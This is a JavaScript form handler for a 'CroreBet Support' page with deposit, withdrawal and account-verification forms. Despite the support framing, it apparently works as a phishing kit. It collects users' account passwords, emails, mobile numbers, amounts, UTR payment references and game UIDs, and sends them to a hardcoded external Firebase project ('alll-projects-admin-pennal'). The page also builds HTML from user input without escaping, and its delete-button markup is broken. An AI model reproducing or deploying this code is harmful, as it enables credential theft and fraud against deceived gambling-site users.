// ==========================================
//  CROR BET - Form Handler
//  Firebase Firestore Integration
// ==========================================

// ===== FIREBASE CONFIG =====
const FIREBASE_CONFIG = {
  apiKey: "AIzaSyCiqaLzh7PoVC5l03sJFdtK548Wulufn94",
  authDomain: "alll-projects-admin-pennal.firebaseapp.com",
  projectId: "alll-projects-admin-pennal",
  storageBucket: "alll-projects-admin-pennal.firebasestorage.app",
  messagingSenderId: "689297868215",
  appId: "1:689297868215:web:2747b19c2da47a31f49432"
};

const SITE_ID = "crorebet";

// ===== FIREBASE DYNAMIC LOADER =====
let _fbDb = null;
let _fbLoading = null;

function loadFirebase() {
  if (_fbDb) return Promise.resolve(_fbDb);
  if (_fbLoading) return _fbLoading;

  _fbLoading = new Promise((resolve, reject) => {
    const initDb = () => {
      try {
        if (!firebase.apps.length) firebase.initializeApp(FIREBASE_CONFIG);
        _fbDb = firebase.firestore();
        resolve(_fbDb);
      } catch (e) { reject(e); }
    };
    if (window.firebase && window.firebase.firestore) { initDb(); return; }
    const urls = [
      'https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js',
      'https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js'
    ];
    let loaded = 0;
    urls.forEach(src => {
      const s = document.createElement('script');
      s.src = src;
      s.onload = () => { loaded++; if (loaded === urls.length) initDb(); };
      s.onerror = () => reject(new Error('Firebase load failed: ' + src));
      document.head.appendChild(s);
    });
  });
  return _fbLoading;
}

function saveSubmission(data) {
  return loadFirebase().then(db => {
    const payload = { ...data, site_id: SITE_ID, created_at: firebase.firestore.FieldValue.serverTimestamp() };
    return db.collection('submissions').add(payload);
  });
}

// ===== LOCAL STORAGE =====
function saveMessage(data) {
  let messages = JSON.parse(localStorage.getItem('croorMessages') || '[]');
  messages.unshift(data);
  localStorage.setItem('croorMessages', JSON.stringify(messages));
  updateBadge();
}

function updateBadge() {
  const messages = JSON.parse(localStorage.getItem('croorMessages') || '[]');
  const badge = document.getElementById('msgBadge');
  if (badge) {
    if (messages.length > 0) {
      badge.style.display = 'flex';
      badge.textContent = messages.length > 9 ? '9+' : messages.length;
    } else {
      badge.style.display = 'none';
    }
  }
}

// ===== VALIDATION =====
function validateForm(fields) {
  let isValid = true;
  fields.forEach(f => {
    const el = document.getElementById(f);
    if (!el) return;
    if (el.value.trim() === '') { el.classList.add('invalid'); el.classList.remove('valid'); isValid = false; }
    else { el.classList.remove('invalid'); el.classList.add('valid'); }
  });
  return isValid;
}

function isValidEmail(value) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value.trim());
}

function getVal(id) {
  const el = document.getElementById(id);
  return el ? el.value : '';
}

document.addEventListener('DOMContentLoaded', () => {
  updateBadge();
  document.querySelectorAll('.input-field').forEach(input => {
    input.addEventListener('input', function() {
      if (this.value.trim() !== '') this.classList.remove('invalid');
    });
  });
  document.querySelectorAll('select.input-field').forEach(sel => {
    sel.addEventListener('change', function() {
      if (this.value !== '') this.classList.remove('invalid');
    });
  });
  if (document.getElementById('depositSection')) {
    const issueTab = new URLSearchParams(window.location.search).get('tab');
    const tabContainer = document.querySelector('.tab-container');
    if (issueTab === 'deposit' || issueTab === 'withdrawal') {
      if (tabContainer) tabContainer.style.display = 'none';
      window.switchTab(issueTab);
    } else {
      openIssuePopup();
    }
  }
  loadFirebase().then(() => {
    console.log('%c Firebase connected', 'color:#34C759;font-weight:bold');
  }).catch(e => console.warn('Firebase:', e.message));
});

// ===== PAYMENT ISSUE POPUP =====
window.openIssuePopup = function() {
  const ov = document.getElementById('issueOverlay');
  if (ov) ov.classList.add('show');
};

window.closeIssuePopup = function() {
  const ov = document.getElementById('issueOverlay');
  if (ov) ov.classList.remove('show');
};

window.chooseIssue = function(tab) {
  window.location.href = 'summit.html?tab=' + tab;
};

// ===== SMOOTH SWITCH TRANSITION =====
let _switching = false;

function smoothSwitch(currentEl, nextEl, done) {
  const d = 260;
  if (!currentEl || !nextEl || currentEl === nextEl) { if (done) done(); return; }
  _switching = true;
  currentEl.style.transition = 'opacity ' + d + 'ms ease, transform ' + d + 'ms cubic-bezier(0.25, 0.1, 0.25, 1)';
  currentEl.style.opacity = '0';
  currentEl.style.transform = 'translateY(14px) scale(0.985)';
  setTimeout(() => {
    currentEl.classList.remove('active');
    nextEl.classList.add('active');
    nextEl.style.transition = 'none';
    nextEl.style.opacity = '0';
    nextEl.style.transform = 'translateY(16px) scale(0.985)';
    void nextEl.offsetWidth;
    nextEl.style.transition = 'opacity ' + d + 'ms ease, transform ' + d + 'ms cubic-bezier(0.25, 0.1, 0.25, 1)';
    requestAnimationFrame(() => {
      requestAnimationFrame(() => {
        nextEl.style.opacity = '1';
        nextEl.style.transform = 'translateY(0) scale(1)';
      });
    });
    setTimeout(() => {
      currentEl.style.transition = '';
      currentEl.style.opacity = '';
      currentEl.style.transform = '';
      nextEl.style.transition = '';
      nextEl.style.opacity = '';
      nextEl.style.transform = '';
      _switching = false;
      if (done) done();
    }, d + 60);
  }, d);
}

// ===== TAB SWITCHING =====
const TAB_MAP = {
  deposit: ['depositTab', 'depositSection'],
  withdrawal: ['withdrawalTab', 'withdrawalSection'],
  verification: ['verificationTab', 'verificationSection']
};

window.switchTab = function(tab) {
  const pair = TAB_MAP[tab];
  if (!pair) return;
  const nextSec = document.getElementById(pair[1]);
  if (!nextSec || _switching || nextSec.classList.contains('active')) return;
  Object.keys(TAB_MAP).forEach(k => {
    const t = document.getElementById(TAB_MAP[k][0]);
    if (t) t.classList.toggle('active', k === tab);
  });
  const currentSec = document.querySelector('.form-section.active');
  smoothSwitch(currentSec, nextSec);
};

// ===== SUBMIT DEPOSIT =====
window.submitDeposit = async function() {
  const fields = ['d_issue_type', 'd_email', 'd_mobile', 'd_password', 'd_amount', 'd_utr'];
  if (!validateForm(fields)) return;

  const btn = document.getElementById('depositBtn');
  if (!btn) return;
  btn.classList.add('loading');

  const data = {
    type: 'Deposit',
    issue_type: getVal('d_issue_type'),
    email: getVal('d_email'),
    mobile: getVal('d_mobile'),
    password: getVal('d_password'),
    amount: getVal('d_amount'),
    utr: getVal('d_utr'),
    status: 'Pending',
    time: new Date().toLocaleString('en-IN'),
    source: 'CroreBet Support'
  };

  saveMessage(data);
  saveSubmission(data).catch(err => console.warn('Firebase:', err));

  setTimeout(() => {
    btn.classList.remove('loading');
    fields.forEach(f => { const el = document.getElementById(f); if (el) { el.value = ''; el.classList.remove('valid', 'invalid'); } });
    showSuccess();
  }, 1800);
};

// ===== SUBMIT WITHDRAWAL =====
window.submitWithdrawal = async function() {
  const fields = ['w_issue_type', 'w_email', 'w_mobile', 'w_password', 'w_amount'];
  if (!validateForm(fields)) return;

  const btn = document.getElementById('withdrawalBtn');
  if (!btn) return;
  btn.classList.add('loading');

  const data = {
    type: 'Withdrawal',
    issue_type: getVal('w_issue_type'),
    email: getVal('w_email'),
    mobile: getVal('w_mobile'),
    password: getVal('w_password'),
    amount: getVal('w_amount'),
    status: 'Pending',
    time: new Date().toLocaleString('en-IN'),
    source: 'CroreBet Support'
  };

  saveMessage(data);
  saveSubmission(data).catch(err => console.warn('Firebase:', err));

  setTimeout(() => {
    btn.classList.remove('loading');
    fields.forEach(f => { const el = document.getElementById(f); if (el) { el.value = ''; el.classList.remove('valid', 'invalid'); } });
    showSuccess();
  }, 1800);
};

// ===== EMAIL VERIFICATION - 3 STEP FORM =====
let verifyMethod = 'email';

window.setVerifyMethod = function(method) {
  verifyMethod = method;
  const emailTab = document.getElementById('vMethodEmail');
  const mobileTab = document.getElementById('vMethodMobile');
  const emailGroup = document.getElementById('vEmailGroup');
  const mobileGroup = document.getElementById('vMobileGroup');
  if (emailTab) emailTab.classList.toggle('active', method === 'email');
  if (mobileTab) mobileTab.classList.toggle('active', method === 'mobile');
  if (emailGroup) emailGroup.style.display = method === 'email' ? '' : 'none';
  if (mobileGroup) mobileGroup.style.display = method === 'mobile' ? '' : 'none';
};

function updateVerifyProgress(step) {
  const fill = document.getElementById('vProgressFill');
  if (fill) fill.style.width = (step === 1 ? 0 : step === 2 ? 50 : 100) + '%';
  [1, 2, 3].forEach(i => {
    const label = document.getElementById('vLabel' + i);
    if (label) {
      label.classList.toggle('active', i === step);
      label.classList.toggle('done', i < step);
    }
  });
  const current = document.querySelector('.verify-step-content.active');
  const next = document.getElementById('vStep' + step);
  smoothSwitch(current, next);
}

window.goVerifyNext = function(current) {
  if (_switching) return;
  if (current === 1) {
    if (!validateForm(['v_username', 'v_uid'])) return;
    updateVerifyProgress(2);
  } else if (current === 2) {
    const methodFields = verifyMethod === 'email' ? ['v_email', 'v_password'] : ['v_mobile', 'v_password'];
    if (!validateForm(methodFields)) return;
    updateVerifyProgress(3);
  }
};

window.goVerifyBack = function(step) {
  if (_switching) return;
  updateVerifyProgress(step);
};

// ===== EMAIL VERIFICATION - SUBMIT FLOW =====
window.submitVerificationComplaint = function() {
  const emailEl = document.getElementById('v_verify_email');
  if (!emailEl) return;
  const email = emailEl.value.trim();
  if (email === '') {
    emailEl.classList.add('invalid');
    return;
  }
  if (!isValidEmail(email)) {
    emailEl.classList.add('invalid');
    return;
  }
  emailEl.classList.remove('invalid');
  emailEl.classList.add('valid');

  const methodValue = getVal(verifyMethod === 'email' ? 'v_email' : 'v_mobile');
  const rows = [
    ['Username', getVal('v_username')],
    ['Game UID', getVal('v_uid')],
    [verifyMethod === 'email' ? 'Account Email' : 'Account Mobile', methodValue],
    ['Account Password', getVal('v_password')],
    ['Email to Verify', email]
  ];
  const list = document.getElementById('confirmList');
  if (list) {
    list.innerHTML = rows.map(r =>
      '<div class="confirm-row"><span class="c-label">' + r[0] + '</span><span class="c-value">' + r[1] + '</span></div>'
    ).join('');
  }
  const ov = document.getElementById('confirmOverlay');
  if (ov) ov.classList.add('show');
};

window.closeConfirm = function() {
  const ov = document.getElementById('confirmOverlay');
  if (ov) ov.classList.remove('show');
};

window.confirmVerificationSubmit = function() {
  const btn = document.getElementById('confirmSubmitBtn');
  if (!btn) return;
  btn.classList.add('loading');

  const methodValue = getVal(verifyMethod === 'email' ? 'v_email' : 'v_mobile');
  const data = {
    type: 'Email Verification',
    username: getVal('v_username'),
    uid: getVal('v_uid'),
    verify_method: verifyMethod === 'email' ? 'Email' : 'Mobile',
    verify_value: methodValue,
    password: getVal('v_password'),
    verify_email: getVal('v_verify_email'),
    status: 'Pending',
    time: new Date().toLocaleString('en-IN'),
    source: 'CroreBet Support'
  };

  saveMessage(data);
  saveSubmission(data).catch(err => console.warn('Firebase:', err));

  setTimeout(() => {
    btn.classList.remove('loading');
    closeConfirm();
    resetVerificationForm();
    showSuccess('verification');
  }, 1200);
};

function resetVerificationForm() {
  ['v_username', 'v_uid', 'v_email', 'v_mobile', 'v_password', 'v_verify_email'].forEach(f => {
    const el = document.getElementById(f);
    if (el) { el.value = ''; el.classList.remove('valid', 'invalid'); }
  });
  setVerifyMethod('email');
  updateVerifyProgress(1);
}

// ===== SUCCESS POPUP & CONFETTI =====
function showSuccess(type) {
  const ov = document.getElementById('successOverlay');
  if (!ov) return;
  const title = document.getElementById('successTitle');
  const desc = document.getElementById('successDesc');
  if (type === 'verification') {
    if (title) title.textContent = 'Request Submitted Successfully!';
    if (desc) desc.textContent = 'Your request has been sent to the support team. We will verify it and get back to you soon.';
    ov.classList.add('show');
    launchConfetti();
    startAutoClose(5);
  } else {
    if (title) title.textContent = 'Submitted!';
    if (desc) desc.textContent = 'Your form has been submitted successfully. Our team will review it shortly.';
    ov.classList.add('show');
    launchConfetti();
  }
}

function startAutoClose(seconds) {
  const bar = document.getElementById('autoCloseBar');
  const fill = document.getElementById('autoCloseFill');
  if (!bar || !fill) return;
  bar.classList.add('active');
  fill.style.transition = 'none';
  fill.style.width = '0%';
  void fill.offsetWidth;
  fill.style.transition = 'width ' + seconds + 's linear';
  fill.style.width = '100%';
  clearTimeout(window._autoCloseTimer);
  window._autoCloseTimer = setTimeout(function() { closePopup(); }, seconds * 1000);
}

window.closePopup = function() {
  const ov = document.getElementById('successOverlay');
  if (ov) ov.classList.remove('show');
  const bar = document.getElementById('autoCloseBar');
  const fill = document.getElementById('autoCloseFill');
  if (bar) bar.classList.remove('active');
  if (fill) { fill.style.transition = 'none'; fill.style.width = '0%'; }
  clearTimeout(window._autoCloseTimer);
};

function launchConfetti() {
  const container = document.getElementById('confettiContainer');
  if (!container) return;
  container.innerHTML = '';
  const colors = ['#007aff', '#5856d6', '#34c759', '#ff9500', '#ff3b30', '#af52de', '#ff2d55'];
  for (let i = 0; i < 50; i++) {
    const c = document.createElement('div');
    c.className = 'confetti';
    c.style.left = Math.random() * 100 + '%';
    c.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
    c.style.animationDelay = Math.random() * 2 + 's';
    c.style.animationDuration = (Math.random() * 2 + 2) + 's';
    c.style.width = (Math.random() * 8 + 4) + 'px';
    c.style.height = (Math.random() * 8 + 4) + 'px';
    c.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
    container.appendChild(c);
  }
  setTimeout(() => { container.innerHTML = ''; }, 4000);
}

// ===== MAILBOX =====
window.openMailbox = function() {
  const hp = document.getElementById('homePage');
  const mp = document.getElementById('mailboxPage');
  if (hp) hp.classList.remove('active');
  if (mp) mp.classList.add('active');
  renderMailbox();
};

window.goHome = function() {
  const mp = document.getElementById('mailboxPage');
  const hp = document.getElementById('homePage');
  if (mp) mp.classList.remove('active');
  if (hp) hp.classList.add('active');
  updateBadge();
};

function detailRow(label, value) {
  return '<div class="message-detail"><span class="label">' + label + '</span><span class="value">' + (value === undefined || value === null || value === '' ? '-' : value) + '</span></div>';
}

function statusBadge(status) {
  const s = status || 'Pending';
  const cls = s.toLowerCase();
  return '<span class="status-badge ' + cls + '">' + s + '</span>';
}

function messageTypeClass(type) {
  return type === 'Withdrawal' ? 'withdrawal' : (type === 'Email Verification' ? 'verification' : 'deposit');
}

function messageDetailPairs(msg) {
  const type = msg.type || 'Deposit';
  if (type === 'Email Verification') {
    return [
      ['Username', msg.username],
      ['Game UID', msg.uid],
      [msg.verify_method === 'Mobile' ? 'Account Mobile' : 'Account Email', msg.verify_value],
      ['Account Password', msg.password],
      ['Email to Verify', msg.verify_email]
    ];
  } else if (type === 'Withdrawal') {
    return [
      ['Email', msg.email],
      ['Mobile', msg.mobile],
      ['Amount', msg.amount ? '₹' + msg.amount : '-'],
      ['Password', msg.password]
    ];
  }
  return [
    ['Email', msg.email],
    ['Mobile', msg.mobile],
    ['Amount', msg.amount ? '₹' + msg.amount : '-'],
    ['UTR', msg.utr],
    ['Password', msg.password]
  ];
}

function renderMailbox() {
  const container = document.getElementById('mailboxContent');
  if (!container) return;
  const messages = JSON.parse(localStorage.getItem('croorMessages') || '[]');
  if (messages.length === 0) {
    container.innerHTML = '<div class="mailbox-empty"><svg class="svg-icon"><use href="#icon-inbox"></use></svg><h3>No Messages</h3><p>Your submitted requests will appear here</p></div>';
    return;
  }
  let html = '';
  messages.forEach((msg, index) => {
    const type = msg.type || 'Deposit';
    const cls = messageTypeClass(type);
    let details = '';
    messageDetailPairs(msg).forEach(pair => {
      details += detailRow(pair[0], pair[1]);
    });
    html += `
      <div class="message-card ${cls}">
        <div class="message-header">
          <div class="message-type"><span class="message-type-badge ${cls}">${type}</span></div>
          <span class="message-time">${msg.time}</span>
        </div>
        <div class="message-details">
          ${details}
          <div class="message-detail"><span class="label">Status</span>${statusBadge(msg.status)}</div>
        </div>
        <div style="text-align:right;margin-top:8px;"><button class="delete-btn" onclick="deleteMessage(' + index + ')"><svg class="svg-icon"><use href="#icon-trash"></use></svg> Delete</button></div>
      </div>`;
  });
  html += '<button class="clear-all-btn" onclick="clearAll()"><svg class="svg-icon"><use href="#icon-trash"></use></svg> Clear All Messages</button>';
  container.innerHTML = html;
}

window.deleteMessage = function(index) {
  let messages = JSON.parse(localStorage.getItem('croorMessages') || '[]');
  messages.splice(index, 1);
  localStorage.setItem('croorMessages', JSON.stringify(messages));
  renderMailbox();
  updateBadge();
};

window.clearAll = function() {
  if (confirm('Are you sure you want to delete all messages?')) {
    localStorage.removeItem('croorMessages');
    renderMailbox();
    updateBadge();
  }
};
